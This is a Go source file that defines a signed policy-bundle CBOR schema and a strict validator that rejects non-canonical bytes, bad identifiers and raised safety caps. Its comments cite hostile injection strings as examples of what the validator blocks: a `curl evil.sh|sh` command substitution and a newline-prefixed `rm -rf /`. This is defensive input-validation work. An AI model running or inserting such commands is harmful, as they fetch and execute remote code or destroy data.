// The PolicyBundle v1 schema and the publish-side reference decoder (07 "the
// canonical CBOR schema"; FR-POLICY-001/-002).
//
// WHY A DECODER LIVES ON THE SERVER AT ALL. 05 §4.1: publication must "verify
// no command string can decode -- the structural rule -- a compiler bug that
// emits one must die here, at publish, not at ten thousand edges." A bundle
// that fails Validate never gets a signature, never gets a seq, and therefore
// never exists. This is the same check the edge runs, run one step earlier,
// where the blast radius is one HTTP 500 in an internal job instead of a fleet.
//
// The strictness is mostly the library's: ExtraDecErrorUnknownField is 07's
// decode rule 3 ("an unknown key in any section fails decode"), and typed
// structs make rules 2 and 4 unrepresentable -- there is no `wasm_module`
// field to populate and no anchor field that is not a catalog ID. What is left
// for Validate is rule 1: every `tstr` must satisfy its production. That one
// cannot come from types, because Go's string type admits `$(curl evil.sh|sh)`
// exactly as happily as `claudecode`.

package policydist

import (
	"fmt"
	"math"
	"regexp"
	"time"

	"github.com/fxamacker/cbor/v2"
)

// SchemaID is the only value the `schema` field may hold. Forward
// compatibility is policy_bundle.v2 with its own signing regime (07 rule 3),
// never a tolerated stray.
const SchemaID = "policy_bundle.v1"

// BundleDomainPrefix is decision D-Q's domain separator. The signing input is
// this || canonical-CBOR(sigInput) -- canonical CBOR is self-delimiting, so
// splice ambiguity is closed by construction rather than by field ordering.
const BundleDomainPrefix = "mark1-bundle-v1\x00"

// SectionNames in 07's fixed order. The slice is the vocabulary: a seventh
// section is a v2, and the ACK ledger's CHECK constraint holds the same six.
var SectionNames = []string{"verify", "route", "memory", "cortex", "gates", "agent_maps"}

// canonEnc is RFC 8949 §4.2.1 core deterministic encoding -- definite lengths,
// bytewise-lexicographic map key order, shortest-form integers and floats. A
// section's bytes must be a pure function of its content or a signature over
// them means nothing.
var canonEnc = mustEncMode(cbor.CoreDetEncOptions())

// strictDec is the decode half of 07's rejection rules: unknown keys fail,
// duplicate keys fail, indefinite lengths fail (they are a second encoding of
// the same value, and a second encoding is a canonicalisation escape), invalid
// UTF-8 fails, and `time` must arrive as tag 1 rather than a bare number.
var strictDec = mustDecMode(cbor.DecOptions{
	DupMapKey:         cbor.DupMapKeyEnforcedAPF,
	ExtraReturnErrors: cbor.ExtraDecErrorUnknownField,
	IndefLength:       cbor.IndefLengthForbidden,
	UTF8:              cbor.UTF8RejectInvalid,
	TimeTag:           cbor.DecTagRequired,
})

func mustEncMode(o cbor.EncOptions) cbor.EncMode {
	o.Time = cbor.TimeUnix
	o.TimeTag = cbor.EncTagRequired
	m, err := o.EncMode()
	if err != nil {
		panic("policydist: bad CBOR encode options: " + err.Error())
	}
	return m
}

func mustDecMode(o cbor.DecOptions) cbor.DecMode {
	m, err := o.DecMode()
	if err != nil {
		panic("policydist: bad CBOR decode options: " + err.Error())
	}
	return m
}

// ---------------------------------------------------------------------------
// The wire shapes. Field order in Go is irrelevant (canonical encoding sorts
// keys); the `cbor` tags ARE the wire contract.
// ---------------------------------------------------------------------------

// Bundle is 07's `policy-bundle`. Inclusion is a pointer with omitempty for
// one load-bearing reason: `body_sha256`, `prev_hash` and the tlog leaf all
// commit to "the canonical map minus its `inclusion` entry" (08 §3.2), and a
// nil pointer gives that encoding from the same struct instead of from a
// second, drift-prone copy of it.
type Bundle struct {
	Schema string `cbor:"schema"`
	// 07 writes this `uuid`; D-Q's signing structure pins the wire form as
	// `bstr .size 16`, and that is the form used here -- the CDDL prelude has
	// no `uuid` production, so the sig-input's explicit one is the only
	// non-invented reading.
	TenantID   []byte               `cbor:"tenant_id"`
	Channel    string               `cbor:"channel"`
	Seq        uint64               `cbor:"seq"`
	IssuedAt   time.Time            `cbor:"issued_at"`
	MaxAge     uint64               `cbor:"max_age"` // seconds
	PrevHash   []byte               `cbor:"prev_hash"`
	Sections   Sections             `cbor:"sections"`
	Signatures map[string]Signature `cbor:"signatures"`
	Inclusion  *Inclusion           `cbor:"inclusion,omitempty"`
}

type Signature struct {
	KeyID string `cbor:"key_id"`
	Sig   []byte `cbor:"sig"`
}

// Inclusion is the RFC 6962 inclusion proof, in the four-key shape frozen by
// `conformance/vectors/bundle/` and decoded by both `rust/mark1-policy`
// (the reference) and `go/mark1d/internal/policy`. Those decoders call
// strict_keys, so an extra key is as fatal as a missing one.
//
// 07's CDDL references `transparency-proof` without defining it. That is a real
// doc gap, but it was NOT open: the vector commit is normative where the prose
// delegates a construction detail (conformance/vectors/bundle/README.md, 12
// §3.4), and it fixed these names before this file was written. An earlier
// version of this struct invented `audit_path`/`root_hash`/`key_id`/`sig`
// instead, which no edge could decode — every bundle at seq > 0 was M1E-3003,
// fleet-wide. See D-BF.
//
// key_id and sig are deliberately absent. A head signature carried *inside* the
// bundle is the "root the bundle carried in" that D-S forbids the edge from
// trusting; the signed head is fetched separately from the key surface, and
// this proof must target that head. tlog_signed_heads still stores both.
type Inclusion struct {
	TreeSize  uint64   `cbor:"tree_size"`
	LeafIndex uint64   `cbor:"leaf_index"`
	AuditPath [][]byte `cbor:"path"`
	RootHash  []byte   `cbor:"root"`
}

type Sections struct {
	Verify    VerifySection    `cbor:"verify"`
	Route     RouteSection     `cbor:"route"`
	Memory    MemorySection    `cbor:"memory"`
	Cortex    CortexSection    `cbor:"cortex"`
	Gates     GatesSection     `cbor:"gates"`
	AgentMaps AgentMapsSection `cbor:"agent_maps"`
}

type VerifySection struct {
	Anchors   []AnchorEnable  `cbor:"anchors"`
	Verifiers []VerifierModel `cbor:"verifiers"`
	// posterior4 over (satisfied, violated, refused, error) -- order fixed.
	Priors            [4]float64         `cbor:"priors"`
	CorrelationGroups []CorrelationGroup `cbor:"correlation_groups"`
	Quarantine        []string           `cbor:"quarantine"`
}

type AnchorEnable struct {
	CatalogID  string             `cbor:"catalog_id"`
	Enabled    bool               `cbor:"enabled"`
	Thresholds map[string]float64 `cbor:"thresholds,omitempty"`
	// Pointer, not uint: `? debounce_ms` distinguishes absent from 0, and
	// omitempty on a bare uint would silently re-encode an explicit 0 as
	// absent -- a canonicalisation mismatch against the bytes we signed.
	DebounceMS *uint64 `cbor:"debounce_ms,omitempty"`
}

type VerifierModel struct {
	VerifierID string `cbor:"verifier_id"`
	// confusion4x3: row = true verdict (order fixed), col = observed signal
	// (accept, reject, abstain). Decision D-R: 4x3, not 4x4.
	Confusion [4][3]float64 `cbor:"confusion"`
}

type CorrelationGroup struct {
	GroupID string   `cbor:"group_id"`
	Members []string `cbor:"members"`
}

type RouteSection struct {
	CPVS        []CPVSRow    `cbor:"cpvs"`
	Ladders     []Ladder     `cbor:"ladders"`
	Knee        KneeTable    `cbor:"knee"`
	Exploration *Exploration `cbor:"exploration,omitempty"`
	// D-EF: the publisher-signed tenant opt-in that ε>0 requires; a pointer so present-false round-trips canonically.
	ExplorationOptIn *bool `cbor:"exploration_opt_in,omitempty"`
}

type CPVSRow struct {
	TaskClass string  `cbor:"task_class"`
	ModelID   string  `cbor:"model_id"`
	PPass     float64 `cbor:"p_pass"`
	TokensEst uint64  `cbor:"tokens_est"`
}

type Ladder struct {
	LadderID string `cbor:"ladder_id"`
	Rungs    []Rung `cbor:"rungs"`
}

type Rung struct {
	ModelID    string `cbor:"model_id"`
	KeepPrefix bool   `cbor:"keep_prefix"`
}

type KneeTable struct {
	CostBasis string    `cbor:"cost_basis"`      // "usd" | "quota"
	Basis     string    `cbor:"basis,omitempty"` // ADR-0013: "prior" | "anchor_grounded" | "certified"; absent on a bundle that predates it
	Rows      []KneeRow `cbor:"rows"`
	VDefault  float64   `cbor:"v_default"`
}

type KneeRow struct {
	N  uint64  `cbor:"n"`
	CN float64 `cbor:"c_n"`
	// Decision D-Z: OPTIONAL. Absent ⇒ the knee is not evaluable at that n ⇒
	// Stop = false. Never stop on missing data.
	PLCB *float64 `cbor:"p_lcb,omitempty"`
}

type Exploration struct {
	Epsilon float64 `cbor:"epsilon"`
}

type MemorySection struct {
	InjectionRules []InjectionRule `cbor:"injection_rules"`
	Budgets        MemoryBudgets   `cbor:"budgets"`
}

type InjectionRule struct {
	Facet    string  `cbor:"facet"`
	MaxItems *uint64 `cbor:"max_items,omitempty"`
}

type MemoryBudgets struct {
	PackTokensMax uint64 `cbor:"pack_tokens_max"`
}

type CortexSection struct {
	MapBudgetTokens BudgetRange `cbor:"map_budget_tokens"`
	Channels        []string    `cbor:"channels"`
	// 07 `? learned_ranker`: ABSENT ⇒ no learned ranker, cortexd serves PPR order (06 §12.4).
	LearnedRanker *LearnedRanker `cbor:"learned_ranker,omitempty"`
}

// LearnedRanker is 07's `learned-ranker`; Coefficients is a slice, not [4]float64, so a
// wrong arity reaches validateCortex as M1E-3001 instead of being zero-padded by the decoder.
type LearnedRanker struct {
	Stage        string    `cbor:"stage"` // "probation" | "shadow" | "active"
	Weight       float64   `cbor:"weight"`
	Bias         float64   `cbor:"bias"`
	Coefficients []float64 `cbor:"coefficients"`
}

type BudgetRange struct {
	Min uint64 `cbor:"min"`
	Max uint64 `cbor:"max"`
}

type GatesSection struct {
	StopGateEnabled bool `cbor:"stop_gate_enabled"`
	// `.le 3`: a bundle may LOWER the local hard cap, never raise it.
	MaxConsecutiveBlocks uint64 `cbor:"max_consecutive_blocks"`
	HourlyBlockCeiling   uint64 `cbor:"hourly_block_ceiling"`
}

type AgentMapsSection struct {
	Agents []AgentMap `cbor:"agents"`
}

type AgentMap struct {
	AgentID      string            `cbor:"agent_id"`
	AgentVersion string            `cbor:"agent_version"`
	HookFields   map[string]string `cbor:"hook_fields"`  // m1p-field => json-pointer
	TailerRules  map[string]string `cbor:"tailer_rules"` // identifier => json-pointer
}

// ---------------------------------------------------------------------------
// 07's string productions. Anchored with \A..\z, not ^..$: Go's ^ and $ are
// text anchors by default but one MultiLine flag anywhere downstream would
// turn "\nrm -rf /" into a passing identifier.
// ---------------------------------------------------------------------------
var (
	reIdentifier  = regexp.MustCompile(`\A[A-Za-z0-9_.:@-]{1,128}\z`) // 07 rule 1(d), the fallback production
	reCatalogID   = regexp.MustCompile(`\A[a-z0-9_.-]{1,64}\z`)
	reVerifierID  = regexp.MustCompile(`\A[a-z0-9_.@-]{1,128}\z`)
	reM1PField    = regexp.MustCompile(`\A[a-z0-9_.]{1,64}\z`)
	reJSONPointer = regexp.MustCompile(`\A(/[^/~]*(~[01][^/~]*)*)*\z`) // RFC 6901
)

const jsonPointerMaxLen = 1024

// cortexChannels, costBases and kneeBases are 07's closed enums. Closed means closed: a
// value outside the set is a decode failure, not a value to ignore.
var (
	cortexChannels = map[string]bool{"session_start": true, "prompt_submit": true, "before_model": true}
	costBases      = map[string]bool{"usd": true, "quota": true}
	kneeBases      = map[string]bool{"prior": true, "anchor_grounded": true, "certified": true}
	rankerStages   = map[string]bool{"probation": true, "shadow": true, "active": true}
)

// rankerCoefficients is l2_graph::FEATURES' arity: [fan_in, recency, path_depth, tag_count].
const rankerCoefficients = 4

// RejectError carries an 08 §9 code. Distinct from an infrastructure error:
// a rejection is final for these bytes (the compiler must fix the bundle),
// an error is retryable as-is.
type RejectError struct {
	Code   string
	Detail string
}

func (e *RejectError) Error() string { return fmt.Sprintf("policydist: %s: %s", e.Code, e.Detail) }

func reject(code, format string, a ...any) *RejectError {
	return &RejectError{Code: code, Detail: fmt.Sprintf(format, a...)}
}

// DecodeSections decodes and validates the six-section map, then proves the
// submitted bytes were already canonical.
//
// The byte-equality check is the part that is easy to leave out and expensive
// to omit. Silently re-canonicalising a sloppy submission would mean the bytes
// the compiler hashed and the bytes we signed differ, and the disagreement
// would surface months later as an unreproducible signature on one customer's
// fleet. A non-canonical submission is a compiler bug; it dies here.
func DecodeSections(raw []byte) (Sections, error) {
	var s Sections
	if err := strictDec.Unmarshal(raw, &s); err != nil {
		// Unknown keys, dup keys, indefinite lengths, wrong array arity and
		// bad UTF-8 all land here. 07 rule 3 makes every one of them fatal.
		return Sections{}, reject("M1E-3005", "sections do not decode under the strict reference decoder: %v", err)
	}
	if err := ValidateSections(s); err != nil {
		return Sections{}, err
	}
	canon, err := canonEnc.Marshal(s)
	if err != nil {
		return Sections{}, fmt.Errorf("policydist: re-encoding sections: %w", err)
	}
	if string(canon) != string(raw) {
		return Sections{}, reject("M1E-3005",
			"submitted section bytes are not RFC 8949 §4.2.1 canonical (%d bytes in, %d canonical); the compiler must submit deterministic CBOR",
			len(raw), len(canon))
	}
	return s, nil
}

// ValidateSections is 07's decode-time rejection rule 1 plus the normative
// numeric constraints. Rule 2 (anchors by catalog ID), rule 3 (strict maps)
// and rule 4 (no wasm_module) are enforced by the types and the decode mode
// above and have nothing to check here.
//
// Every failure rejects the WHOLE bundle. 07: "there is no partial acceptance,
// because a half-applied bundle is an untested policy."
func ValidateSections(s Sections) error {
	if err := validateVerify(s.Verify); err != nil {
		return err
	}
	if err := validateRoute(s.Route); err != nil {
		return err
	}
	if err := validateMemory(s.Memory); err != nil {
		return err
	}
	if err := validateCortex(s.Cortex); err != nil {
		return err
	}
	if err := validateGates(s.Gates); err != nil {
		return err
	}
	return validateAgentMaps(s.AgentMaps)
}

// ident is the workhorse: 07 rule 1(d) says a bare `tstr` in the grammar is
// shorthand for the fallback identifier production, never for arbitrary text.
// Whitespace, quotes, slashes, pipes, `$(`, newlines and NULs are all outside
// the class, which is what makes "no command strings" structural.
func ident(where, v string) error {
	if !reIdentifier.MatchString(v) {
		return reject("M1E-3005", "%s = %q is not the identifier production [A-Za-z0-9_.:@-]{1,128} (07 rule 1d)", where, v)
	}
	return nil
}

func pointer(where, v string) error {
	if len(v) > jsonPointerMaxLen {
		return reject("M1E-3005", "%s is %d bytes, over the 1024-byte JSON-pointer bound", where, len(v))
	}
	if !reJSONPointer.MatchString(v) {
		return reject("M1E-3005", "%s = %q is not an RFC 6901 JSON pointer", where, v)
	}
	return nil
}

// finite refuses NaN and ±Inf everywhere. Not pedantry: NaN compares false
// against every threshold, so a NaN gate threshold is a gate that never fires,
// and NaN has no canonical CBOR encoding worth signing.
func finite(where string, f float64) error {
	if math.IsNaN(f) || math.IsInf(f, 0) {
		return reject("M1E-3001", "%s is not a finite number (%v)", where, f)
	}
	return nil
}

func unitInterval(where string, f float64) error {
	if err := finite(where, f); err != nil {
		return err
	}
	if f < 0 || f > 1 {
		return reject("M1E-3001", "%s = %v is outside [0,1]", where, f)
	}
	return nil
}

// distributionTol is the float tolerance 07 mandates for "MUST sum to 1.0
// within float tolerance". Loose enough for a compiler that normalises in
// float32, tight enough that an unnormalised row cannot pass.
const distributionTol = 1e-6

func sumsToOne(where string, xs []float64) error {
	total := 0.0
	for i, x := range xs {
		if err := unitInterval(fmt.Sprintf("%s[%d]", where, i), x); err != nil {
			return err
		}
		total += x
	}
	if math.Abs(total-1.0) > distributionTol {
		// 07's own reasoning: an all-zero priors passes a per-entry range
		// check and then makes the Python twin's softmax raise "zero posterior
		// mass" -- a validly-signed bundle that detonates fusion at runtime.
		return reject("M1E-3001", "%s sums to %v, not 1.0; a row that is not a distribution is a compiler bug", where, total)
	}
	return nil
}

func validateVerify(v VerifySection) error {
	for i, a := range v.Anchors {
		if !reCatalogID.MatchString(a.CatalogID) {
			return reject("M1E-3005", "anchors[%d].catalog_id = %q is not [a-z0-9_.-]{1,64}; anchors are enabled by LOCAL catalog ID only (07 rule 2)", i, a.CatalogID)
		}
		for k, tv := range a.Thresholds {
			if err := ident(fmt.Sprintf("anchors[%d].thresholds key", i), k); err != nil {
				return err
			}
			if err := finite(fmt.Sprintf("anchors[%d].thresholds[%q]", i, k), tv); err != nil {
				return err
			}
		}
	}
	seen := make(map[string]bool, len(v.Verifiers))
	for i, vm := range v.Verifiers {
		if !reVerifierID.MatchString(vm.VerifierID) {
			return reject("M1E-3005", "verifiers[%d].verifier_id = %q is not [a-z0-9_.@-]{1,128}", i, vm.VerifierID)
		}
		if seen[vm.VerifierID] {
			// Two confusion matrices for one verifier is two opinions about
			// the same observation model; fusion would silently use whichever
			// the decoder saw last.
			return reject("M1E-3001", "verifiers[%d] repeats verifier_id %q", i, vm.VerifierID)
		}
		seen[vm.VerifierID] = true
		for r := range vm.Confusion {
			if err := sumsToOne(fmt.Sprintf("verifiers[%d].confusion[%d]", i, r), vm.Confusion[r][:]); err != nil {
				return err
			}
		}
	}
	if err := sumsToOne("verify.priors", v.Priors[:]); err != nil {
		return err
	}
	for i, g := range v.CorrelationGroups {
		if err := ident(fmt.Sprintf("correlation_groups[%d].group_id", i), g.GroupID); err != nil {
			return err
		}
		if len(g.Members) == 0 {
			return reject("M1E-3001", "correlation_groups[%d] has no members ([+ verifier-id] is one-or-more)", i)
		}
		for j, m := range g.Members {
			if !reVerifierID.MatchString(m) {
				return reject("M1E-3005", "correlation_groups[%d].members[%d] = %q is not a verifier-id", i, j, m)
			}
		}
	}
	for i, q := range v.Quarantine {
		if !reVerifierID.MatchString(q) {
			return reject("M1E-3005", "quarantine[%d] = %q is not a verifier-id", i, q)
		}
	}
	return nil
}

func validateRoute(r RouteSection) error {
	for i, c := range r.CPVS {
		if err := ident(fmt.Sprintf("cpvs[%d].task_class", i), c.TaskClass); err != nil {
			return err
		}
		if err := ident(fmt.Sprintf("cpvs[%d].model_id", i), c.ModelID); err != nil {
			return err
		}
		if err := unitInterval(fmt.Sprintf("cpvs[%d].p_pass", i), c.PPass); err != nil {
			return err
		}
	}
	for i, l := range r.Ladders {
		if err := ident(fmt.Sprintf("ladders[%d].ladder_id", i), l.LadderID); err != nil {
			return err
		}
		if len(l.Rungs) == 0 {
			return reject("M1E-3001", "ladders[%d] has no rungs ([+ ...] is one-or-more)", i)
		}
		for j, rung := range l.Rungs {
			if err := ident(fmt.Sprintf("ladders[%d].rungs[%d].model_id", i, j), rung.ModelID); err != nil {
				return err
			}
		}
	}
	if !costBases[r.Knee.CostBasis] {
		return reject("M1E-3005", "knee.cost_basis = %q is not the closed enum \"usd\"|\"quota\"", r.Knee.CostBasis)
	}
	if r.Knee.Basis != "" && !kneeBases[r.Knee.Basis] {
		return reject("M1E-3001", "knee.basis = %q is not the closed enum prior|anchor_grounded|certified (ADR-0013)", r.Knee.Basis)
	}
	if len(r.Knee.Rows) == 0 {
		return reject("M1E-3001", "knee.rows is empty ([+ ...] is one-or-more); a knee table with no rows stops nothing")
	}
	for i, row := range r.Knee.Rows {
		if err := finite(fmt.Sprintf("knee.rows[%d].c_n", i), row.CN); err != nil {
			return err
		}
		if row.PLCB != nil {
			if err := unitInterval(fmt.Sprintf("knee.rows[%d].p_lcb", i), *row.PLCB); err != nil {
				return err
			}
		}
	}
	if err := finite("knee.v_default", r.Knee.VDefault); err != nil {
		return err
	}
	if r.Exploration != nil {
		// ε > 0 is a per-tenant contractual opt-in (07); this decoder cannot
		// see the contract, so it only bounds the value. The opt-in check is
		// the compiler's, and the honest propensity logging is the edge's.
		if err := unitInterval("route.exploration.epsilon", r.Exploration.Epsilon); err != nil {
			return err
		}
		if r.Exploration.Epsilon > 0 && (r.ExplorationOptIn == nil || !*r.ExplorationOptIn) {
			return reject("M1E-3001", "route.exploration.epsilon = %v without exploration_opt_in = true (D-EF)", r.Exploration.Epsilon)
		}
	}
	return nil
}

func validateMemory(m MemorySection) error {
	for i, ir := range m.InjectionRules {
		if err := ident(fmt.Sprintf("memory.injection_rules[%d].facet", i), ir.Facet); err != nil {
			return err
		}
	}
	return nil
}

func validateCortex(c CortexSection) error {
	if c.MapBudgetTokens.Min > c.MapBudgetTokens.Max {
		return reject("M1E-3001", "cortex.map_budget_tokens min %d > max %d; the budget binary search has no interval to search",
			c.MapBudgetTokens.Min, c.MapBudgetTokens.Max)
	}
	for i, ch := range c.Channels {
		if !cortexChannels[ch] {
			return reject("M1E-3005", "cortex.channels[%d] = %q is not the closed enum session_start|prompt_submit|before_model", i, ch)
		}
	}
	if c.LearnedRanker == nil {
		return nil
	}
	// Every ranker miss is M1E-3001, matching both edge decoders and the frozen
	// cortex_ranker_* negatives; cortexd never clamps, so the publisher never lets one through.
	r := c.LearnedRanker
	if !rankerStages[r.Stage] {
		return reject("M1E-3001", "cortex.learned_ranker.stage = %q is not the closed enum probation|shadow|active", r.Stage)
	}
	if err := unitInterval("cortex.learned_ranker.weight", r.Weight); err != nil {
		return err
	}
	if err := finite("cortex.learned_ranker.bias", r.Bias); err != nil {
		return err
	}
	if len(r.Coefficients) != rankerCoefficients {
		return reject("M1E-3001", "cortex.learned_ranker.coefficients has %d entries, want exactly %d (one per cortexd file feature)", len(r.Coefficients), rankerCoefficients)
	}
	for i, cf := range r.Coefficients {
		if err := finite(fmt.Sprintf("cortex.learned_ranker.coefficients[%d]", i), cf); err != nil {
			return err
		}
	}
	return nil
}

func validateGates(g GatesSection) error {
	if g.MaxConsecutiveBlocks > 3 {
		// `uint .le 3`, and the direction matters: a bundle may LOWER the
		// local hard cap, never raise it (07; FR-POLICY-006).
		return reject("M1E-3001", "gates.max_consecutive_blocks = %d exceeds the hard cap of 3; a bundle may lower the local cap, never raise it", g.MaxConsecutiveBlocks)
	}
	if g.HourlyBlockCeiling > maxHourlyBlockCeiling {
		// Same direction as mcb (FR-VERIFY-010): lower only. 0 is "edge default".
		return reject("M1E-3001", "gates.hourly_block_ceiling = %d exceeds the edge's built-in ceiling of %d; a bundle may lower the local ceiling, never raise it", g.HourlyBlockCeiling, maxHourlyBlockCeiling)
	}
	return nil
}

// maxHourlyBlockCeiling mirrors mark1d/internal/fabric/gate.go
// DefaultHourlyCeiling. 07's CDDL types hourly_block_ceiling as a bare `uint`
// and 06 names no number; the edge's built-in is the only ceiling that exists,
// so a bundle above it is a raise the edge would have to clamp.
// ponytail: provisional until 07 pins a number; a different module's const,
// hand-copied — bump both or neither.
const maxHourlyBlockCeiling = 30

func validateAgentMaps(a AgentMapsSection) error {
	for i, m := range a.Agents {
		if err := ident(fmt.Sprintf("agents[%d].agent_id", i), m.AgentID); err != nil {
			return err
		}
		if err := ident(fmt.Sprintf("agents[%d].agent_version", i), m.AgentVersion); err != nil {
			return err
		}
		for k, v := range m.HookFields {
			if !reM1PField.MatchString(k) {
				return reject("M1E-3005", "agents[%d].hook_fields key %q is not [a-z0-9_.]{1,64}", i, k)
			}
			if err := pointer(fmt.Sprintf("agents[%d].hook_fields[%q]", i, k), v); err != nil {
				return err
			}
		}
		for k, v := range m.TailerRules {
			if err := ident(fmt.Sprintf("agents[%d].tailer_rules key", i), k); err != nil {
				return err
			}
			if err := pointer(fmt.Sprintf("agents[%d].tailer_rules[%q]", i, k), v); err != nil {
				return err
			}
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// Encoding
// ---------------------------------------------------------------------------

// sectionBytes is the per-section canonical CBOR the D-Q signing structure
// carries as `section: bstr`. Deterministic encoding is compositional, so
// these bytes are byte-identical to the corresponding span inside the encoded
// envelope -- which is what lets the edge verify a section signature without
// re-encoding anything.
func sectionBytes(s Sections) (map[string][]byte, error) {
	each := map[string]any{
		"verify": s.Verify, "route": s.Route, "memory": s.Memory,
		"cortex": s.Cortex, "gates": s.Gates, "agent_maps": s.AgentMaps,
	}
	out := make(map[string][]byte, len(each))
	for name, v := range each {
		b, err := canonEnc.Marshal(v)
		if err != nil {
			return nil, fmt.Errorf("policydist: encoding section %s: %w", name, err)
		}
		out[name] = b
	}
	return out, nil
}

// sigInput is decision D-Q's signing structure, verbatim. Every envelope field
// except `inclusion` is covered: `issued_at` and `max_age` because an
// unsigned issued_at revives a rotated-out key and an unsigned max_age lets an
// attacker set the fail-static floor; `section_name` because without it one
// key published into all six rings makes the section split a configuration
// property with zero code enforcement.
type sigInput struct {
	Schema      string    `cbor:"schema"`
	SectionName string    `cbor:"section_name"`
	TenantID    []byte    `cbor:"tenant_id"`
	Channel     string    `cbor:"channel"`
	Seq         uint64    `cbor:"seq"`
	IssuedAt    time.Time `cbor:"issued_at"`
	MaxAge      uint64    `cbor:"max_age"`
	PrevHash    []byte    `cbor:"prev_hash"`
	Section     []byte    `cbor:"section"`
}

// SigningInput builds the D-Q signing input for one section of b. Exported so
// the conformance vectors and the edge-side twin can be checked against the
// one implementation that publishes.
func SigningInput(b *Bundle, sectionName string, sectionCBOR []byte) ([]byte, error) {
	in := sigInput{
		Schema: b.Schema, SectionName: sectionName, TenantID: b.TenantID,
		Channel: b.Channel, Seq: b.Seq, IssuedAt: b.IssuedAt, MaxAge: b.MaxAge,
		PrevHash: b.PrevHash, Section: sectionCBOR,
	}
	body, err := canonEnc.Marshal(in)
	if err != nil {
		return nil, fmt.Errorf("policydist: encoding signing input: %w", err)
	}
	return append([]byte(BundleDomainPrefix), body...), nil
}

// CanonicalBody is the bundle minus its `inclusion` entry -- the bytes
// `prev_hash`, `body_sha256` and the transparency-log leaf all commit to. A
// leaf cannot commit to the proof of its own inclusion (07; 08 §3.2).
func CanonicalBody(b *Bundle) ([]byte, error) {
	shallow := *b
	shallow.Inclusion = nil
	out, err := canonEnc.Marshal(&shallow)
	if err != nil {
		return nil, fmt.Errorf("policydist: encoding bundle body: %w", err)
	}
	return out, nil
}

// Marshal encodes the servable bundle: body plus inclusion, canonical.
func Marshal(b *Bundle) ([]byte, error) {
	out, err := canonEnc.Marshal(b)
	if err != nil {
		return nil, fmt.Errorf("policydist: encoding bundle: %w", err)
	}
	return out, nil
}

// Unmarshal decodes a whole bundle under the strict decoder. Used by tests and
// by anything re-reading the catalog; the serving path streams stored bytes
// and never re-encodes.
func Unmarshal(raw []byte) (*Bundle, error) {
	var b Bundle
	if err := strictDec.Unmarshal(raw, &b); err != nil {
		return nil, reject("M1E-3005", "bundle does not decode under the strict reference decoder: %v", err)
	}
	if b.Schema != SchemaID {
		return nil, reject("M1E-3005", "schema = %q, want %q", b.Schema, SchemaID)
	}
	if err := ValidateSections(b.Sections); err != nil {
		return nil, err
	}
	return &b, nil
}
